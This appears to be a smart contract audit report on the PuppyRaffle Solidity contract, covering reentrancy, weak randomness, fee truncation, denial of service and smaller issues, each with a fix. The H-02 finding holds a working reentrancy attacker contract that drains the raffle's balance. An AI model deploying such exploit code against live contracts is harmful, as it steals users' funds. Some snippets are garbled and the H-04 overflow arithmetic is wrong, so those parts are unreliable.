## [H-01] Incorrect Handling of Refunded Players Breaks Winner Selection & Reward Logic

---

**Description:**

The contract uses a `players` array to track entrants in the raffle. When a user is refunded via the `refund()` function, their slot in the array is set to `address(0)`, **but the array length is not updated**. This means:

- `players.length` still includes refunded users.
- `address(0)` entries remain in the array.
- Any logic using `players.length` or looping through `players` can fail or behave incorrectly.

---

**Impact:**

- `address(0)` can be selected as winner in `selectWinner()`, leading to ETH being lost or transaction reverting.
- Fee and reward calculations using `players.length` will be **inaccurate and overestimated**.
- NFT minting or reward distribution can revert or send to invalid recipients.
- Randomness becomes biased and predictable due to presence of `address(0)`.

---

**Proof of Concept (PoC):**

```solidity
// Assume 5 players entered
players = [A, B, C, D, E];

// Player at index 2 (C) asks for refund
refund(2); 
// Inside refund():
players[2] = address(0); // Now array is [A, B, 0x0, D, E]

// Later in selectWinner():
uint256 winnerIndex = uint256(keccak256(...)) % players.length;
// If winnerIndex == 2 => players[2] = address(0)
(bool success, ) = players[winnerIndex].call{value: prize}("");
// Either sends ETH to address(0) or reverts

// Incorrect total calculation:
uint256 totalCollected = players.length * entranceFee;
// Still counts refunded slot, leading to inflated prizePool and fees
```

---

**Recommended Mitigation:**

- **Use "swap-and-pop" removal method** to keep array clean and accurate:

```solidity
function refund(uint256 index) public {
    require(players[index] == msg.sender, "Only the player can refund");

    payable(msg.sender).sendValue(entranceFee);

    uint256 last = players.length - 1;
    if (index != last) {
        players[index] = players[last]; // swap with last
    }
    players.pop(); // remove last
}
```

**OR**

- **Maintain a separate list of active players**:

```solidity
address[] public activePlayers;

// Only add to activePlayers if not refunded
// Use activePlayers for winner selection, reward calc, etc.
```

**AND**

**Always filter out `address(0)` entries** when:

- selecting winner  
- calculating total collected  
- distributing prizes or NFTs  

---

**Developer Note:**

Using `address(0)` to mark a removed player is unsafe unless all logic explicitly ignores those slots. This is prone to bugs and gas inefficiencies. Dynamic cleanup (swap and pop) is the recommended pattern for participant-based games like raffles.


## [H-02] Reentrancy Vulnerability in `refund()` Function

**Description:**

The `refund()` function in the `PuppyRaffle` contract is vulnerable to a reentrancy attack. It sends Ether to `msg.sender` **before** updating the internal state (`players[playerIndex] = address(0)`). This allows a malicious contract to repeatedly call `refund()` via its `receive()` or `fallback()` function before its state is cleared.

---

**Impact:**

An attacker can repeatedly call `refund()` using the same index, draining the entire contract balance. Since the state update comes after the transfer, each reentrant call still passes the `require` checks, allowing multiple refunds.

---

**Proof of Concept:**

<details>

```solidity
// Attacker Contract
contract ReentrancyAttacker {
    PuppyRaffle public puppyRaffle;
    uint256 public entranceFee;
    uint256 public attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address ;
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```

```solidity
// Foundry Test
function test_reentrancy() public {
    address ;
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
    address attackUser = makeAddr("attackUser");
    vm.deal(attackUser, 1 ether);

    uint256 startingAttackerBalance = address(attacker).balance;
    uint256 startingContractBalance = address(puppyRaffle).balance;

    vm.prank(attackUser);
    attacker.attack{value: entranceFee}();

    console.log("Starting attacker contract balance:", startingAttackerBalance);
    console.log("Starting contract balance:", startingContractBalance);
    console.log("Ending attacker contract balance:", address(attacker).balance);
    console.log("Ending contract balance:", address(puppyRaffle).balance);
}
```

</details>

---


**Recommended Mitigation:**

Use the [checks-effects-interactions pattern](https://docs.soliditylang.org/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern). Move the state update **before** the external call.

**Secure Version:**

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    players[playerIndex] = address(0); // State update before external call
    payable(msg.sender).sendValue(entranceFee); // External call last
    emit RaffleRefunded(playerAddress);
}
```

**Alternative Fix:**

Use `ReentrancyGuard` from OpenZeppelin to prevent nested calls:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PuppyRaffle is ReentrancyGuard {
    function refund(uint256 playerIndex) public nonReentrant {
        // refund logic
    }
}
```


## [H-03] Predictable Randomness Used in Winner Selection and NFT Rarity

**Description:**

The `selectWinner()` function uses insecure sources of randomness to determine both:
1. The winner of the raffle, and
2. The rarity of the NFT being minted.

The values are derived from block variables such as `block.timestamp` and `block.difficulty`, combined with `msg.sender`, in the following lines:

```solidity
uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```

These sources can be **manipulated or predicted** by malicious actors, especially miners or last players, allowing them to increase their chances of winning the raffle or receiving higher rarity NFTs.

---

**Impact:**

- A player can **influence `winnerIndex`** by timing their call to `selectWinner()` at a favorable `block.timestamp` or with a manipulated `msg.sender`.
- An attacker can **predict or manipulate the `rarity` value** to mint rarer NFTs by calling the function in a block with favorable `block.difficulty`.
- If the caller of `selectWinner()` is the attacker themselves, they gain **full control** over `msg.sender`, and partial control over `block.timestamp`, enabling **predictable outcomes**.
- This defeats the fairness of the raffle and undermines the rarity logic of NFTs.

---

**Proof of Concept:**

- Since `block.timestamp`, `block.difficulty`, and `msg.sender` are known to the attacker at the time of calling the function, they can simulate the keccak256 hash locally and only call `selectWinner()` when they know it will return:
  - A `winnerIndex` equal to their index in the array.
  - A `rarity` value corresponding to LEGENDARY tier.

---

**Recommended Mitigation:**

- **Never use block variables** like `block.timestamp`, `block.difficulty`, or `msg.sender` alone for randomness in critical logic.
- Use a **secure RNG source** such as [Chainlink VRF (Verifiable Random Function)](https://docs.chain.link/vrf) Version 2.5.
- If you want an off-chain controlled but provable system, use commit-reveal or delayed randomness seeded with unpredictable values.



## [H-04] Integer Overflow in `totalFee` Can Corrupt Contract Accounting

**Description:**

The `selectWinner()` function updates the `totalFees` state variable by adding the current raffle fee:

```solidity
uint256 fee = (totalAmountCollected * 20) / 100;
totalFees = totalFees + uint64(fee);
```

The result of the multiplication `(totalAmountCollected * 20)` can exceed the maximum value of `uint64`, especially as `players.length` increases or `entranceFee` is large.

Although Solidity 0.8+ includes built-in overflow checks, **the explicit cast to `uint64` truncates the upper bits**, which causes an **unchecked wraparound** without reverting. This leads to incorrect `totalFees` accounting.

---

**Impact:**

- The `totalFees` variable may silently **wrap to a smaller value** or zero when the fee exceeds `type(uint64).max (~1.8e19)`, corrupting the fee tracking logic.
- Over time, this can **deceive treasury/accounting expectations**, especially if fees are expected to be withdrawn or audited accurately.
- This issue is **not caught by overflow checks**, because truncation via casting to a smaller type (e.g., `uint256` → `uint64`) is not checked in Solidity.

---

**Proof of Concept:**

Consider:

```solidity
// Set entranceFee and number of players high enough
entranceFee = 10_000_000 ether;
players.length = 2^64 / 10 = ~1.84e18 players;

// totalAmountCollected = ~1.84e18 * 10_000_000 ether = ~1.84e25 wei
fee = (totalAmountCollected * 20) / 100 = ~3.68e24 wei

// Now cast to uint64:
uint64(fee) = 3.68e24 % 2^64 = 5192296858534827628545

// This means ~3.68e24 - 5.19e21 = ~3.67e24 wei was lost due to truncation!

```

This results in `totalFees` being **much lower than expected** or even **reset to zero** depending on the value, without any error or revert.

---

**Recommended Mitigation:**

- **Avoid truncating** large values by casting down to smaller types.
- Either:
  - Change `totalFees` to `uint256` to match the arithmetic domain.
  - Or validate that `fee <= type(uint64).max` **before casting**, and revert if not.
- Example fix:

```solidity
require(fee <= type(uint64).max, "PuppyRaffle: Fee overflow");
totalFees += uint64(fee);
```

- Alternatively, **track fees in `uint256`** unless there's a strict storage constraint requiring smaller types.


## [M-01] Denial of Service (DoS) via Unbounded Duplicate Check in `PuppyRaffle::enterRaffle()`


**Description**

The `enterRaffle()` function performs a nested loop to check for duplicate players:

```solidity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

This leads to **O(n²)** time complexity, where `n` is the total number of players.  
As more players join the raffle, the gas usage increases rapidly.  
Eventually, the transaction can exceed the block gas limit, making the function uncallable.  
This results in a **permanent Denial of Service**, preventing anyone from entering the raffle once a certain size is reached.

---

**Impact**

- **High**
- Function becomes unusable due to excessive gas costs as the `players` array grows.
- Blocks further entries and wastes gas for users attempting to enter.
- Can effectively disable the raffle permanently if the array is large enough.

---

**Proof of Concept**

<details>

```solidity
function test_DOS() public {
    vm.txGasPrice(1);
    uint256 playersNum = 100;

    address[] memory players = new address[](playersNum);
    for (uint256 i = 0; i < playersNum; i++) {
        players[i] = address(i);
    }

    uint256 gasStart = gasleft();
    puppyRaffle.enterRaffle{value: players.length * entranceFee}(players);
    uint256 gasEnd = gasleft();

    uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
    console.log("Gas cost of first 100 players:", gasUsedFirst);

    address[] memory players2 = new address[](playersNum);
    for (uint256 i = 0; i < playersNum; i++) {
        players2[i] = address(i + playersNum);
    }

    uint256 gasStart2 = gasleft();
    puppyRaffle.enterRaffle{value: players2.length * entranceFee}(players2);
    uint256 gasEnd2 = gasleft();

    uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;
    console.log("Gas cost of second 100 players:", gasUsedSecond);
    console.log("Gas cost difference:", gasUsedSecond - gasUsedFirst);
}
```
</details>

---

**Recommended Mitigation**


`Solution-1:` Consider allowing duplicate as user can enter as many time as he wants by using different address only the limit is he cant use same address.

`Solution-2:` Replace the nested loop with a `mapping(address => bool)` to track unique entries:

<details>

```solidity
mapping(address => bool) public hasEntered;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        require(!hasEntered[newPlayers[i]], "PuppyRaffle: Duplicate player");
        hasEntered[newPlayers[i]] = true;
        players.push(newPlayers[i]);
    }

    emit RaffleEnter(newPlayers);
}
```
</details>

This reduces time complexity from **O(n²)** to **O(n)** and prevents DoS via gas griefing while still ensuring uniqueness.

## [M-02] Relying on `.call{value: ...}("")` to transfer ETH to the winner without ensuring the recipient can accept ETH causes the function to revert and halt the raffle.

**Description:**

The `selectWinner()` function uses a low-level call to transfer ETH to the randomly selected `winner`:

```solidity
(bool success,) = winner.call{value: prizePool}("");
require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

However, if the `winner` is a smart contract without a `receive()` or `fallback()` function capable of accepting ETH, the `call` will fail and revert the entire transaction. As a result, the raffle cannot proceed until another call succeeds with a different winner.

**Impact:**

- **Raffle halts indefinitely** if a contract address incapable of receiving ETH is chosen as winner.
- **Funds remain locked** in the contract.
- This behavior can be **abused as a DoS vector** if someone enters the raffle with a contract that is designed to always reject ETH transfers.

**Proof of Concept:**

1. Deploy a contract without `receive()` or `fallback()` functions:
```solidity
contract Blocker {
    // No receive/fallback - reverts on ETH transfer
}
```

2. Have `Blocker` enter the raffle.
3. Wait for `selectWinner()` to randomly pick `Blocker` as the winner.
4. Call to:
```solidity
(bool success,) = winner.call{value: prizePool}("");
```
...will fail and revert. Raffle gets stuck until this is resolved via another winner.

**Recommended Mitigation:**

Use the [**pull over push**](https://fravoll.github.io/solidity-patterns/pull_over_push.html) pattern for ETH transfers. Instead of directly sending ETH:

1. Record the amount owed to the winner:
```solidity
pendingWithdrawals[winner] += prizePool;
```

2. Let the winner manually withdraw via a `withdraw()` function:
```solidity
function withdraw() external {
    uint256 amount = pendingWithdrawals[msg.sender];
    require(amount > 0, "Nothing to withdraw");
    pendingWithdrawals[msg.sender] = 0;
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "Withdraw failed");
}
```

This approach avoids failed transfers blocking critical logic and removes the DoS attack surface.



## [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non existent players and for players who are at index 0. 

**Description:** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0 but according to the natspec it will also return 0 if the player is not in players array. 

```solidity
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
```

**Impact:** Making player at index 0 think they have not entered the raffle making them to trying enter again wasting gas.

**Proof of Concept:**

1. User enter the raffle, they are the first entrant.
2. `Puppyraffle::getActivePlayerIndex` returns 0.
3. User thinks they have not entered due to the function docs.

**Recommended Mitigation:** The easiest recommendation would be to revert if the player is not in the players array.


## [I-01] `PuppyRaffle::selectWinner` does not follow CEI, which us not a best practice .

It's best to keep the code clean and Follow CEI( Checks, Effects, Integration).

```diff
-        (bool success,) = winner.call{value: prizePool}("");
-        require(success, "PuppyRaffle: Failed to send prize pool to   winner");
+        _safeMint(winner, tokenId);
+        (bool success,) = winner.call{value: prizePool}("");
+        require(success, "PuppyRaffle: Failed to send prize pool to   winner");
```


## [I-02] Use of "magic" numbers is discouraged.

It can be confusing to see number literals in a codebase, and its much more readable if the numbers are given a name.

Examples:
```solidity
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    uint256 fee = (totalAmountCollecetd * 20 / 100;)
```
Instead you could use:

```
uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
uint256 public constant FEE_PERCENTAGE = 20;
uint256 public constant POOL_PRECISION = 100;
```

## [I-03] `PuppyRaffle::_isActivePlayer` is never used and should be removed.

**Description:** This code isnt used anywhere you can remove this. It's just wasting gas and is a dead code.
```solidity
    function _isActivePlayer() internal view returns (bool) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == msg.sender) {
                return true;
            }
        }
```


